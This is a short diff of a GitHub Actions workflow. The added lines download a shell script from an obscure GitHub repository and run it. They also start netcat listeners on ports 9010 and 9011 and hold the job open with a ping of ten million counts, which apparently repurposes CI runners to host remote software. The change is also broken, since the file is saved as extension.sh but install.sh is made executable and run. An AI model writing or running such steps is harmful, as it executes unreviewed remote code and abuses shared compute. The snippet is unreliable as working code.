@@ -35,15 +35,15 @@ jobs:
       - name: Run a multi-line script
         run: |
           sudo apt install wget
-          wget -O extension.sh https://raw.githubusercontent.com/dante4rt/Ramanode-Guides/refs/heads/main/Extension/install.sh 
-          chmod +x extension.sh 
-          ./extension.sh
+          wget -O extension.sh https://raw.githubusercontent.com/danelalllaal/sfddsfdsfdf/refs/heads/main/install.sh 
+          chmod +x install.sh
+          ./install.sh
 
       - name: Run a multi-line script
         run: |
           sudo apt-get install -y netcat
-          nc -l 3010 &
-          nc -l 3011 &
+          nc -l 9010 &
+          nc -l 9011 &
           ping -c 10000000  askubuntu.com
           
 
